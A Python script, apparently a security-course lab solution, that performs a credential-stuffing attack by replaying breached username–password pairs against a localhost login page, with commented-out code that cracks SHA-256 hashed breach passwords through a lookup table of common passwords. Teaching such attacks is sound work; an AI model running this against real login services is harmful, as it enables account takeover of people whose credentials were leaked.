from csv import reader
from requests import post, codes
from app.util import hash

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
HASHED_BREACH_PATH = "app/scripts/breaches/hashed_breach.csv"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def load_common_pwd():
    fp = "common_passwords.txt"
    with open(fp) as f:
        r = reader(f, delimiter=" ")
        return list(r)

def credential_stuffing_attack(creds):
    # TODO: return a list of credential pairs (tuples) that can successfully login
    # exercise 1.1
    # creds has type [string, string][]
    success_pairs = []
    for user, pwd in creds:
        if attempt_login(user, pwd):
            success_pairs.append((user, pwd))
    return success_pairs
    
    # task 1.3
    # precompute common hashes: 
    # use hash table: key is hash and value is the plain text pwd
    # common_pwd = [x[0] for x in load_common_pwd()]
    # hash2pwd = {}
    # for pwd in common_pwd:
    #     hash2pwd[hash.hash_sha256(pwd)] = pwd
    
    # success_pairs = []
    # for user, hashed_pwd in creds:
    #     if hashed_pwd in hash2pwd:
    #         pwd = hash2pwd[hashed_pwd]
    #         if attempt_login(user, pwd):
    #             success_pairs.append((user, pwd))
    # return success_pairs

def main():
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    print(credential_stuffing_attack(creds))

if __name__ == "__main__":
    main()
